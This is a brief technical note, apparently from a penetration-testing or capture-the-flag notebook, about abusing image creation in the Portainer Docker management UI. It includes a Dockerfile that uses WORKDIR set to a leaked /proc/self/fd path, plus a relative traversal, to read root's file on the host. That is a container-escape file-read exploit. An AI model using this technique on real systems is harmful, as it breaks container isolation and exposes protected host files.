# Portainer

Portainer is a lightweight management UI which allows you to easily manage your Docker host or Swarm cluster.

## Abuse creation of an Image

We can abuse the creation of images in Portainer to read certain files on the Host.

Using the `WORKDIR` instruction in a Dockerfile, we can traverse the filesystem and read files.

```
FROM ubuntu:latest

WORKDIR /proc/self/fd/8

RUN cat ../../../../root/root.txt
```